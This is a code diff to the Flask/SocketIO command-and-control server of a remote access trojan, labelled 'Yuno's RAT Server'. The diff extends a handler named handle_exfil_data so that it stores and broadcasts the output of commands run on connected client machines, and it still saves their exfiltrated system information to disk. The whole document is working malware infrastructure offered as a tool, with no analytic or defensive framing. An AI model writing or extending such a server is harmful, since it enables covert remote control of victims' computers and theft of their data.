@@ -19,6 +19,10 @@ if not os.path.exists(DATA_DIR):
 clients = {}
 clients_lock = threading.Lock()
 
+# Store command outputs (client_id -> list of {command, output, timestamp})
+command_outputs = {}
+outputs_lock = threading.Lock()
+
 # Flask app and SocketIO
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'secret!'  # Needed for SocketIO
@@ -30,6 +34,9 @@ def handle_connect():
     print(f"[*] New client connected: {client_id}")
     with clients_lock:
         clients[client_id] = request.sid
+    with outputs_lock:
+        if client_id not in command_outputs:
+            command_outputs[client_id] = []
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -45,10 +52,29 @@ def handle_exfil_data(data):
     try:
         client_data = json.loads(data)
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
-        with open(filename, 'w') as f:
-            json.dump(client_data, f, indent=2)
-        print(f"[*] Received data from {client_id}: Saved to {filename}")
+        
+        # Handle different data types
+        if client_data.get("type") == "command_output":
+            # Store command output in memory
+            with outputs_lock:
+                command_outputs[client_id].append({
+                    "command": client_data["command"],
+                    "output": client_data["output"],
+                    "timestamp": timestamp
+                })
+            # Broadcast to web interface
+            socketio.emit('command_output', {
+                "client_id": client_id,
+                "command": client_data["command"],
+                "output": client_data["output"],
+                "timestamp": timestamp
+            }, broadcast=True)
+        else:
+            # Save system info to disk
+            filename = f"{DATA_DIR}/{client_id}_{timestamp}.json"
+            with open(filename, 'w') as f:
+                json.dump(client_data, f, indent=2)
+            print(f"[*] Received data from {client_id}: Saved to {filename}")
     except json.JSONDecodeError:
         print(f"[!] Invalid data from {client_id}: {data}")
 
@@ -95,4 +121,4 @@ def view_file(filename):
 if __name__ == "__main__":
     print("=== Yuno's RAT Server ===")
     print("A remote access tool by Yuno\n")
-    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
+    socketio.run(app, host='0.0.0.0', port=5000)
